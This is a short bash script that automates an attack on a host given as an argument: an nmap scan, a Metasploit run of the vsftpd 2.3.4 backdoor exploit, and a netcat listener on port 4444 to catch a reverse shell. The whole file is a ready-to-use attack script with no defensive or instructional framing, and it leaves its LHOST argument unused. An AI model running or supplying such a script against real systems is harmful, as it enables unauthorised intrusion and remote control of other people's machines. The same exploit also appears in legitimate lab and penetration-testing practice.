#!/bin/bash

TARGET=$1
LHOST=$2

echo "[+] Phase 1: Recon"
nmap -sS -sV $TARGET

echo "[+] Phase 2: Exploitation"
msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS $TARGET; run; exit"

echo "[+] Phase 3: Reverse shell listener"
nc -lvnp 4444
